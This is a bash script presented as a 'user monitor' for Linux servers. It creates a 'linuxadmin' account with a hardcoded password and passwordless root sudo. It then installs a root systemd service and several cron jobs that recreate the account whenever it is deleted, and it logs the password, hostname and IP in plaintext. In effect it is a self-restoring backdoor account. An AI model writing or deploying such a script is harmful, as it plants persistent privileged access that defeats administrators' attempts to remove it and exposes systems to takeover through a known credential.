#!/bin/bash

USER_LIST="/var/lib/auto-users.list"
MONITOR_LOG="/var/log/user-monitor.log"
CREATE_LOG="/var/log/auto-user.log"
LOCK_FILE="/var/run/user-monitor.lock"

setup_script() {
    if [ ! -x "$0" ]; then
        chmod +x "$0"
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Set executable permission for $0" | tee -a "$MONITOR_LOG"
    fi
    
    touch "$MONITOR_LOG"
    touch "$CREATE_LOG"
    touch "$USER_LIST"
    
    chmod 640 "$MONITOR_LOG" "$CREATE_LOG" "$USER_LIST"
    
    if [ ! -f /etc/systemd/system/user-monitor.service ]; then
        cat > /etc/systemd/system/user-monitor.service << EOF
[Unit]
Description=Auto User Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=$0 --monitor
Restart=always
RestartSec=5
User=root
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF
        
        systemctl daemon-reload
        systemctl enable user-monitor.service
        systemctl start user-monitor.service
        
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd service created and started" | tee -a "$MONITOR_LOG"
    fi
    
    setup_crontab
}

setup_crontab() {
    SCRIPT_PATH="$(readlink -f "$0")"
    
    CRON_CHECK_SERVICE="*/5 * * * * systemctl is-active --quiet user-monitor.service || systemctl start user-monitor.service"
    CRON_MANUAL_CHECK="*/3 * * * * $SCRIPT_PATH --cron-check"
    CRON_DAILY_VERIFY="0 */6 * * * $SCRIPT_PATH --verify"
    
    CURRENT_CRON=$(crontab -l 2>/dev/null || echo "")
    
    UPDATED=false
    
    if ! echo "$CURRENT_CRON" | grep -qF "user-monitor.service"; then
        CURRENT_CRON="${CURRENT_CRON}
$CRON_CHECK_SERVICE"
        UPDATED=true
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Added service check to crontab" | tee -a "$MONITOR_LOG"
    fi
    
    if ! echo "$CURRENT_CRON" | grep -qF "$SCRIPT_PATH --cron-check"; then
        CURRENT_CRON="${CURRENT_CRON}
$CRON_MANUAL_CHECK"
        UPDATED=true
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Added manual check to crontab" | tee -a "$MONITOR_LOG"
    fi
    
    if ! echo "$CURRENT_CRON" | grep -qF "$SCRIPT_PATH --verify"; then
        CURRENT_CRON="${CURRENT_CRON}
$CRON_DAILY_VERIFY"
        UPDATED=true
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Added daily verification to crontab" | tee -a "$MONITOR_LOG"
    fi
    
    if [ "$UPDATED" = true ]; then
        echo "$CURRENT_CRON" | crontab -
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Crontab updated successfully" | tee -a "$MONITOR_LOG"
    else
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Crontab entries already exist" | tee -a "$MONITOR_LOG"
    fi
}

log_monitor() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [MONITOR] $1" | tee -a "$MONITOR_LOG"
}

log_create() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [CREATE] $1" | tee -a "$CREATE_LOG"
}

create_linuxadmin_user() {
    exec 200>"$LOCK_FILE"
    flock -n 200 || {
        log_create "Another instance is creating user, skipping..."
        return 1
    }

    if [ "$EUID" -ne 0 ]; then
        log_create "ERROR: Run This Script as ROOT"
        return 1
    fi

    OS="unknown"
    if [ -f /etc/os-release ]; then
        source /etc/os-release
        case "$ID" in
            ubuntu) OS="ubuntu" ;;
            debian) OS="debian" ;;
            centos|rhel|almalinux|rocky) OS="centos" ;;
            fedora) OS="fedora" ;;
        esac
    fi

    if [ "$OS" = "unknown" ]; then
        log_create "ERROR: Cannot detect OS"
        return 1
    fi

    USERNAME="linuxadmin"
    PASSWORD="linuxadminPaSS123!!"

    if id "$USERNAME" &>/dev/null; then
        log_create "User $USERNAME already exists"
        
        if ! grep -q "^${USERNAME}$" "$USER_LIST" 2>/dev/null; then
            echo "$USERNAME" >> "$USER_LIST"
            sort -u "$USER_LIST" -o "$USER_LIST"
        fi
        
        return 0
    fi

    useradd -m -s /bin/bash "$USERNAME" || {
        log_create "ERROR: Failed to create user $USERNAME"
        return 1
    }
    
    echo "$USERNAME:$PASSWORD" | chpasswd || {
        log_create "ERROR: Failed to set password"
        return 1
    }

    case "$OS" in
        ubuntu|debian)
            usermod -aG sudo "$USERNAME"
            log_create "Added $USERNAME to sudo group (Ubuntu/Debian)"
            ;;
        centos|fedora|rhel|almalinux|rocky)
            usermod -aG wheel "$USERNAME"
            log_create "Added $USERNAME to wheel group (CentOS/RHEL)"
            ;;
    esac

    SUDOERS_FILE="/etc/sudoers.d/$USERNAME"
    echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE"
    chmod 440 "$SUDOERS_FILE"
    
    if ! visudo -c -f "$SUDOERS_FILE" &>/dev/null; then
        log_create "ERROR: Invalid sudoers file, removing..."
        rm -f "$SUDOERS_FILE"
        return 1
    fi
    
    log_create "Created sudoers file: $SUDOERS_FILE"

    SSH_PORT=$(grep "^Port" /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}')
    SSH_PORT=${SSH_PORT:-22}

    log_create "=============================================="
    log_create " USER CREATED/RECREATED"
    log_create "----------------------------------------------"
    log_create " SSH PORT : $SSH_PORT"
    log_create " USERNAME : $USERNAME"
    log_create " PASSWORD : $PASSWORD"
    log_create " HOSTNAME : $(hostname)"
    log_create " IP ADDR  : $(hostname -I 2>/dev/null | awk '{print $1}')"
    log_create "=============================================="

    wall "⚠️ User $USERNAME telah dibuat/direcreate pada $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
    
    if ! grep -q "^${USERNAME}$" "$USER_LIST" 2>/dev/null; then
        echo "$USERNAME" >> "$USER_LIST"
        sort -u "$USER_LIST" -o "$USER_LIST"
    fi
    
    flock -u 200
    
    return 0
}

cron_check() {
    USER_PATTERN="^linuxadmin"
    
    if ! getent passwd | grep -q "$USER_PATTERN"; then
        log_monitor "[CRON] ALERT: No linuxadmin user found! Creating..."
        create_linuxadmin_user
    fi
}

verify_setup() {
    log_monitor "[VERIFY] Running comprehensive verification..."
    
    USER_PATTERN="^linuxadmin"
    
    if ! getent passwd | grep -q "$USER_PATTERN"; then
        log_monitor "[VERIFY] User missing, creating..."
        create_linuxadmin_user
    fi
    
    if ! systemctl is-active --quiet user-monitor.service; then
        log_monitor "[VERIFY] Service not running, attempting to start..."
        systemctl start user-monitor.service
    fi
    
    if ! systemctl is-enabled --quiet user-monitor.service; then
        log_monitor "[VERIFY] Service not enabled, enabling..."
        systemctl enable user-monitor.service
    fi
    
    if ! crontab -l 2>/dev/null | grep -q "user-monitor.service"; then
        log_monitor "[VERIFY] Crontab entries missing, re-adding..."
        setup_crontab
    fi
    
    log_monitor "[VERIFY] Verification completed"
}

monitor_users() {
    log_monitor "Starting user monitoring service"
    
    USER_PATTERN="^linuxadmin"
    
    if ! getent passwd | grep -q "$USER_PATTERN"; then
        log_monitor "No linuxadmin user found. Creating initial user..."
        create_linuxadmin_user
    fi
    
    getent passwd | grep "$USER_PATTERN" | cut -d: -f1 | sort > "$USER_LIST"
    
    while true; do
        CURRENT_USERS=$(getent passwd | grep "$USER_PATTERN" | cut -d: -f1 | sort)
        
        if [ -f "$USER_LIST" ]; then
            EXPECTED_USERS=$(cat "$USER_LIST" | sort)
        else
            EXPECTED_USERS=""
        fi
        
        if [ -n "$EXPECTED_USERS" ]; then
            DELETED_USERS=$(comm -13 <(echo "$CURRENT_USERS") <(echo "$EXPECTED_USERS") 2>/dev/null)
            
            if [ -n "$DELETED_USERS" ]; then
                for DELETED_USER in $DELETED_USERS; do
                    log_monitor "ALERT: User $DELETED_USER deleted! Creating new user..."
                    
                    
                    grep -v "^${DELETED_USER}$" "$USER_LIST" > "${USER_LIST}.tmp" 2>/dev/null || true
                    mv "${USER_LIST}.tmp" "$USER_LIST" 2>/dev/null || true
                    
                    
                    create_linuxadmin_user
                    
                    log_monitor "New user created as replacement for $DELETED_USER"
                done
            fi
        fi
        
        
        if [ -n "$CURRENT_USERS" ]; then
            echo "$CURRENT_USERS" > "$USER_LIST"
        fi
        
        sleep 10
    done
}

remove_crontab() {
    SCRIPT_PATH="$(readlink -f "$0")"
    
    
    CURRENT_CRON=$(crontab -l 2>/dev/null || echo "")
    
    
    NEW_CRON=$(echo "$CURRENT_CRON" | grep -v "user-monitor.service" | grep -v "$SCRIPT_PATH")
    
    if [ "$CURRENT_CRON" != "$NEW_CRON" ]; then
        echo "$NEW_CRON" | crontab -
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Crontab entries removed" | tee -a "$MONITOR_LOG"
    else
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] No crontab entries found to remove" | tee -a "$MONITOR_LOG"
    fi
}

main() {
    case "${1:-}" in
        "--setup")
            echo "Running setup..."
            setup_script
            ;;
        "--monitor")
            monitor_users
            ;;
        "--create")
            create_linuxadmin_user
            ;;
        "--cron-check")
            cron_check
            ;;
        "--verify")
            verify_setup
            ;;
        "--setup-cron")
            echo "Setting up crontab..."
            setup_crontab
            ;;
        "--remove-cron")
            echo "Removing crontab entries..."
            remove_crontab
            ;;
        "--status")
            echo "=== User Monitor Status ==="
            echo "Script: $0"
            echo "Permissions: $(ls -la "$0" 2>/dev/null | awk '{print $1}')"
            echo "Monitor Log: $MONITOR_LOG"
            echo "Create Log: $CREATE_LOG"
            echo "User List: $USER_LIST"
            echo ""
            echo "=== Current linuxadmin Users ==="
            getent passwd | grep "^linuxadmin" || echo "No linuxadmin users found"
            echo ""
            echo "=== Systemd Service ==="
            systemctl status user-monitor.service --no-pager 2>/dev/null || echo "Service not running"
            echo ""
            echo "=== Crontab Entries ==="
            crontab -l 2>/dev/null | grep -E "(user-monitor|$(readlink -f "$0"))" || echo "No crontab entries found"
            echo ""
            echo "=== Recent Monitor Logs ==="
            tail -n 10 "$MONITOR_LOG" 2>/dev/null || echo "No logs available"
            ;;
        "--help"|"-h")
            echo "Usage: $0 [OPTION]"
            echo ""
            echo "Options:"
            echo "  --setup        Setup script permissions, systemd service, and crontab"
            echo "  --monitor      Start monitoring users (for systemd service)"
            echo "  --create       Manually create linuxadmin user"
            echo "  --cron-check   Quick check (called by cron)"
            echo "  --verify       Comprehensive verification (called by cron)"
            echo "  --setup-cron   Setup crontab only"
            echo "  --remove-cron  Remove crontab entries"
            echo "  --status       Check current status"
            echo "  --help         Show this help"
            echo ""
            echo "Cron Schedule:"
            echo "  - Every 5 min: Check if systemd service is running"
            echo "  - Every 3 min: Quick user existence check"
            echo "  - Every 6 hrs: Comprehensive verification"
            echo ""
            echo "Examples:"
            ;;
        *)
            setup_script
            create_linuxadmin_user
            echo ""
            echo "✅ Script setup completed!"
            echo ""
            echo "📋 What has been configured:"
            echo "   • Systemd service (real-time monitoring every 10 seconds)"
            echo "   • Crontab failsafe (backup checks every 3-5 minutes)"
            echo ""
            echo "🔍 Available commands:"
            ;;
    esac
}

main "$@"
